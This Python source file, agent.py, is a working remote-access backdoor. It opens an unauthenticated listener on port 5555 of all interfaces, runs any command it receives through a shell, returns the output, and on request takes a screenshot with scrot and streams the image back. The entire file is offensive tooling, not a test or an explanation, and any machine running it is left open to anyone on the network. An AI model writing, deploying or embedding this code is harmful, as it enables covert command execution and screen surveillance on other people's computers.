# agent.py
import socket
import subprocess
import os

HOST = '0.0.0.0'
PORT = 5555

def run_command(cmd):
    """Run a shell command and return output."""
    try:
        output = subprocess.getoutput(cmd)
        return output
    except Exception as e:
        return f"[Error] {str(e)}"

def send_file(conn, filepath):
    """Send a file over the socket."""
    if not os.path.exists(filepath):
        conn.send(b"[!] File not found\n")
        return
    with open(filepath, "rb") as f:
        data = f.read()
    conn.sendall(data + b"<<END_OF_FILE>>")

def handle_client(conn):
    conn.send(b"[*] Connected to agent.\n")

    while True:
        conn.send(b"\nShell> ")
        cmd = conn.recv(1024).decode().strip()
        if cmd == "":
            continue
        if cmd == "exit":
            break

        # Special command: take screenshot
        elif cmd == "screenshot":
            output = run_command("scrot /tmp/screenshot.png")
            conn.send(output.encode() + b"\n")
            send_file(conn, "/tmp/screenshot.png")

        # Other shell commands
        else:
            output = run_command(cmd)
            conn.send(output.encode() + b"\n")

    conn.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[+] Agent listening on {HOST}:{PORT}")

    while True:
        client_socket, addr = server.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")
        handle_client(client_socket)

if __name__ == "__main__":
    main()
